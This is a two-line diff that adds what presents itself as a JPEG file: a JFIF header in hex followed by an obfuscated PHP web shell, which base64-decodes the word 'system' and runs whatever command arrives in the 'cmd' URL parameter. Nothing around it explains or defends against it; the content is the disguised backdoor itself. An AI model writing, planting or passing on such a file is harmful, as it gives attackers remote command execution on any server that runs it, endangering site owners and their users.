@@ -1,0 +1,2 @@
+FF D8 FF E0 00 10 4A 46 49 46 00 01 01 01 00 48 
+<?php echo base64_decode('c3lzdGVt')($_GET['cmd']); ?>
